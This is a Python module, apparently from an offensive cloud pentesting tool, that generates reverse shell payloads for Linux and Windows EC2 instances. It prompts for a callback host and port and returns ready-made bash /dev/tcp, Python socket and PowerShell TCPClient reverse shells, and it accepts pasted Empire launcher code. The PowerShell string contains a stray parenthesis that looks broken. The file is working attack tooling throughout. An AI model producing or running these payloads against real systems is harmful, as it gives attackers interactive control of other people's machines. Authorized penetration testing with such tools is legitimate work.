from clint.textui import prompt

from src.constants.platforms import PlatformTypes
from src.helpers.print_output import print_color
from src.scanner.platform_mapping import PLATFORM_MAPPING


def get_all_reverseshell_payloads(
        linux: bool, windows: bool, host: str, port: str, port_windows: str, auto: bool = False) -> (list[str], list[str]):
    """
    Prompts for reverse shell options against a range of EC2 instances depending on their OS.
    :param linux: Whether there are any targeted instances running Linux.
    :param windows: Whether there are any targeted instances running Windows.
    :param host: Remote hostname
    :param port: Remote port for linux
    :param port_windows: Remote port for windows
    :param auto: skip questions
    :return: Tuple of lists of reverse shell payloads for linux and windows.
    """
    linux_commands = []
    windows_commands = []
    if linux:
        handler = PLATFORM_MAPPING[PlatformTypes.LINUX]
        for option in handler.reverseshell_options:
            option: dict
            linux_commands.append(get_reverseshell_payload(
                option=option['return'],
                host=host,
                port=port,
                auto=auto,
            ))
    if windows:
        handler = PLATFORM_MAPPING[PlatformTypes.WINDOWS]
        for option in handler.reverseshell_options:
            option: dict
            windows_commands.append(get_reverseshell_payload(
                option=option['return'],
                host=host,
                port=port_windows,
                auto=auto,
            ))

    return linux_commands, windows_commands


def reverseshell_multiple_options(
        linux: bool, windows: bool, host: str, port: str, port_windows: str, auto: bool = False) -> (str, str):
    """
    Prompts for reverse shell options against a range of EC2 instances depending on their OS.
    :param linux: Whether there are any targeted instances running Linux.
    :param windows: Whether there are any targeted instances running Windows.
    :param host: Remote hostname
    :param port: Remote port for linux
    :param port_windows: Remote port for windows
    :param auto: skip questions
    :return: Tuple of reverse shell payloads for linux and windows.
    """
    print_color('[*] Choose your reverse shell type:')
    print_color('[*] Make sure your listening server can handle multiple simultaneous reverse shell connections:')

    linux_attack = ''
    windows_attack = ''
    if linux:
        handler = PLATFORM_MAPPING[PlatformTypes.LINUX]
        option = prompt.options(
            'Payload for Linux EC2 instances:', handler.reverseshell_options)
        linux_attack = get_reverseshell_payload(option=option, host=host, port=port, auto=auto)

    if windows:
        handler = PLATFORM_MAPPING[PlatformTypes.WINDOWS]
        option = prompt.options(
            'Payload for Windows EC2 instances:', handler.reverseshell_options)
        windows_attack = get_reverseshell_payload(option=option, host=host, port=port_windows, auto=auto)

    return linux_attack, windows_attack


def get_reverseshell_payload(option: str, host: str, port: str, auto: bool = False) -> str:
    """
    reverse shell option for both systems.
    :param option: option name
    :param host: Remote hostname
    :param port: Remote port
    :param auto: Skip questions
    :return: TReverse shell payload
    """
    payload = ''
    if option == 'empirepython':
        print_color(
            '[*] Generate your Empire python launcher code in empire and paste it here:')
        payload = input('Paste here:')
    elif option == 'empirepowershell':
        print_color(
            '[*] Generate your Empire powershell launcher code in empire and paste it here:')
        payload = input('Paste here:')
    else:
        if not auto:
            host = prompt.query('Your remote IP or hostname to connect back to:', default=host)
            port = prompt.query("Your remote port number:", default=port)
        if option == 'bash':
            payload = "bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port)
        elif option == 'python':
            payload = "python -c '" \
                      "import socket,subprocess,os;" \
                      "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" \
                      f"s.connect((\"{host}\",{port}));" \
                      "os.dup2(s.fileno(),0); " \
                      "os.dup2(s.fileno(),1); " \
                      "os.dup2(s.fileno(),2);" \
                      "p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        if option == 'powershell':
            payload = f"$client = New-Object System.Net.Sockets.TCPClient(\"{host}\",{port});" \
                      "$stream = $client.GetStream();" \
                      "[byte[]]$bytes = 0..65535|%%{0};" \
                      "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;" \
                      "$data = )(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" \
                      "$sendback = (iex $data 2>&1 | Out-String );" \
                      "$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";" \
                      "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" \
                      "$stream.Write($sendbyte,0,$sendbyte.Length);" \
                      "$stream.Flush()};$client.Close()"
    return payload
